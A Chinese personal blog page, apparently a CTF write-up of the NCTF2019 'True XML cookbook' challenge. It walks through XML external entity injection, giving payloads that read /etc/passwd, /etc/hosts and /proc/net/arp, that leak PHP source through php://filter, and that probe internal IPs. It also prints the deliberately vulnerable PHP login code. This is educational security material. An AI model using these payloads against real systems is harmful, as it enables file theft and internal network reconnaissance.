@@ -1,0 +1,385 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习27——xml注入之探测内网 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-30">2021-04-30</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习27——XML注入之探测内网</h2>
+            <div class="post-meta">
+                emm... 3200 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>这道题目是还是xml外部实体注入，只不过扩展了xml注入的攻击手段。这次的xml注入是关于内网探测的攻击。  </p>
+<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>打开题目，是一个登录界面，题目已经提示是xml了，那么直接抓包看看。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png"><img src="https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png"></a>  </p>
+<p>确实是xml的代码格式。可以直接把上一道题目的payload打上去试试。  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;    </code></pre>
+<p>发现确实可用，但是不能直接用file://协议读取flag。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png"><img src="https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png"></a>  </p>
+<p>那么我们先读取一下它的源码</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./doLogin.php&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;    </code></pre>
+<p>确实能读到，但是解码后发现没什么用处。  </p>
+<pre><code>&lt;?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+
+$USERNAME = &#39;admin&#39;; //账号
+$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+
+try&#123;
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+$creds = simplexml_import_dom($dom);
+
+$username = $creds-&gt;username;
+$password = $creds-&gt;password;
+
+if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;
+    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
+&#125;else&#123;
+    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
+&#125;    
+&#125;catch(Exception $e)&#123;
+$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
+&#125;
+
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&gt;</code></pre>
+<p>所以这道题考察的不是xml注入file://协议读取文件了，而是内网探测。  </p>
+<p>我们可以通过xml注入来探测主机ip地址，如下所示：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</code></pre>
+<p>这里的etc/hosts也是一个很重要的文件，它包含了主机名和ip配置文件。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png"><img src="https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png"></a>  </p>
+<p>可以看到主机ip，但是看不到目标主机的ip，这里我们可以读取另一个和ip相关的文件——/proc/net/arp。   </p>
+<pre><code>详细介绍:
+/proc/net/arp
+
+
+
+IP address HW type Flags HW address Mask Device
+
+    192.168.1.151 0x1 0x2 00:e0:4c:19:1a:98 * eth0
+
+    192.168.1.1 0x1 0x2 00:14:78:e7:c4:e8 * eth0
+
+
+每个网络接口的arp表中dev包的统计
+
+IP address：IP地址（直连）
+
+HW type：硬件类型
+
+23=0x17 strip (Metricom Starmode IP)
+
+01=0x01 ether (Ethernet)
+
+15=0xf dlci (Frame Relay DLCI)
+
+Flags：
+
+HW address：MAC 地址
+
+Mask：
+
+Device：所在网络接口</code></pre>
+<p>这两个文件都是和主机地址相关的重要文件，我们读取这个文件可以看到目标主机ip地址。   </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png"><img src="https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png"></a>  </p>
+<p>ip地址为10.0.228.2，我们读取一下这个ip：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+ &lt;!ENTITY xxe SYSTEM &quot;http://10.0.228.2&quot;&gt;
+ ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png"><img src="https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png"></a>  </p>
+<p>发现这个ip读取不了，我们可以一个个的试ip地址，最后发现当ip最后一位为11时，能够成功读取，从而获得flag。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png"><img src="https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png"></a>  </p>
+<p>我们也可以用爆破来得到存活的ip地址：   </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png"><img src="https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png"></a>  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实关于xml外部实体注入还有很多攻击方法，或者说是用法，现在已经学到了读取文件和探测主机，下面会附上其他用法，以后遇到要多做积累。  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whoim_i/article/details/104370532?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161984410316780262525304%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161984410316780262525304&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-104370532.first_rank_v2_pc_rank_v29&utm_term=xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4449">XXE漏洞（XML外部实体注入）</a>  </p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
